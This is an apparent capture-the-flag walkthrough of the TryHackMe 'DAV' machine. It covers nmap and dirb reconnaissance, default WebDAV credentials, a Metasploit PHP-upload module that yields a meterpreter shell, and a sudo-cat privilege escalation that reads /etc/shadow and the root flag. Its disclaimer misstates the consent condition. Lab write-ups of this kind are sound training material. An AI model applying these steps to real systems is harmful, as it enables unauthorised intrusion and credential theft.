@@ -1,0 +1,108 @@
+A walkthrough of my process in completing the DAV room on TryHackMe
+
+DAV is a boot2root machine for FIT and bsides guatemala CTF
+
+Created by stuxnet
+
+Completed in virtual environments and published for educational purposes. 
+Methods demonstrated should not be applied to entities with their explicit consent 
+
+WALKTHROUGH
+
+Begin with reconnaissance
+  ──(kali㉿kali)-[~]
+  └─$ nmap -sV -sC -A -T4 <TARGETIP>
+  ...
+  PORT   STATE SERVICE VERSION
+  80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+  |_http-title: Apache2 Ubuntu Default Page: It works
+  |_http-server-header: Apache/2.4.18 (Ubuntu)
+
+Looks like we're jsut dealing with a web page for now
+
+Run dirb to enumerate the page for hidden directories with vulnerabilities
+  ──(kali㉿kali)-[~]
+  └─$ sudo dirb http://<TARGETIP> -w /usr/share/wordlists/dirb/vulns/apache.txt 
+
+While it's running, access the page via browser
+  Apache default page
+
+Let's check for additional open ports while dirb is scanning
+  ┌──(kali㉿kali)-[~]
+  └─$ nmap -sV -p- -T4 --min-rate=5000 <TARGETIP>
+    No yield
+
+Let's race nmap against dirb and compare outputs (spoiler, it's way faster but less thorough); better for this activity in my opinion
+  ┌──(kali㉿kali)-[~]
+  └─$ nmap -sV --script=http-enum -A -T4 <TARGETIP>    
+    PORT   STATE SERVICE VERSION
+    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+    |_http-server-header: Apache/2.4.18 (Ubuntu)
+    | http-enum: 
+    |_  /webdav/: Potentially interesting folder (401 Unauthorized)
+
+      dirb output for reference 
+        ---- Scanning URL: http://<TARGETIP>/ ----
+        + http://<TARGETIP>/index.html (CODE:200|SIZE:11321)                     
+        + http://<TARGETIP>/server-status (CODE:403|SIZE:301)                    
+        + http://<TARGETIP>/webdav (CODE:401|SIZE:460)                           
+                                                      
+Navigate to hidden page, met with login form
+  http://<TARGETIP>/webdav
+
+Boot up burpsuite to analyse GET request and POST returns for username and password submission
+  Username and password are paired and encoded in base64
+  Brute force doesn't seem like the most efficient strategy 
+  Change course
+
+Boot up metasploit and search for webdav crendential
+  One result
+     #  Name                                          Disclosure Date  Rank       Check  Description
+     -  ----                                          ---------------  ----       -----  -----------
+     0  exploit/windows/http/xampp_webdav_upload_php  2012-01-14       excellent  No     XAMPP WebDAV PHP Upload 
+
+Check module options and identify default credentials
+Set options as necessary and return to browser
+    RHOSTS - <TARGETIP>
+    LHOSTS - <ATTACKMACHINE>
+  
+Use default credentials to login to webdav via popup on <TARGETIP>/webdav
+
+Run metasploit exploit and refresh page
+  This uploads a php file that will provide us access to the system via the terminal
+
+Open file uploaded to webdav and get a meterpreter session in metasploit
+
+Navigate through file heirarchy to find directory for user 'merlin'
+  cat user.txt
+    [flag 1]
+
+From here, I create a shell so I can check my uid and sudo privileges
+  meterpreter > shell
+  Process 881 created.
+  Channel 3 created.
+  id
+  uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  sudo -l
+  Matching Defaults entries for www-data on ubuntu:
+      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+  User www-data may run the following commands on ubuntu:
+      (ALL) NOPASSWD: /bin/cat
+
+Great! I can use sudo cat to view any file in the system I know the path of without a password, even if it's in a folder I don't have access to
+Since I know the name of the file I'm looking for finding the second flag is quick work
+  sudo cat /root/root.txt
+  [flag 2]
+
+Challenge completed!
+
+Then just to be thorough
+  sudo cat /etc/shadow
+    Copy and paste into a new file on my machine
+      Save for hash cracking practice later
+  Navigate back to wampp directory
+    Remove .php files uploaded by metasploit
+    Exfiltrate passwd.dav file for cracking practice
+
+
